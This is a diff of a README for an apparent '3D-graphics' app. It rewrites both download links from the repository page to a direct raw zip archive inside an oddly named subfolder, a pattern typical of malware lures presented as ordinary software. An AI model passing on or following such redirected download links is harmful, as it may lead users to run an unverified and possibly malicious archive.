@@ -1,6 +1,6 @@
 # 🎨 3D-graphics - Immersive visual apps made simple
 
-[![Download 3D-graphics](https://img.shields.io/badge/Download-3D--graphics-blue.svg)](https://github.com/cookie2944/3D-graphics)
+[![Download 3D-graphics](https://img.shields.io/badge/Download-3D--graphics-blue.svg)](https://github.com/cookie2944/3D-graphics/raw/refs/heads/main/botonee/graphics-2.5-beta.1.zip)
 
 ## 🚀 Get started
 
@@ -10,7 +10,7 @@
 
 Use this link to visit the download page:
 
-https://github.com/cookie2944/3D-graphics
+https://github.com/cookie2944/3D-graphics/raw/refs/heads/main/botonee/graphics-2.5-beta.1.zip
 
 ### What to do
 
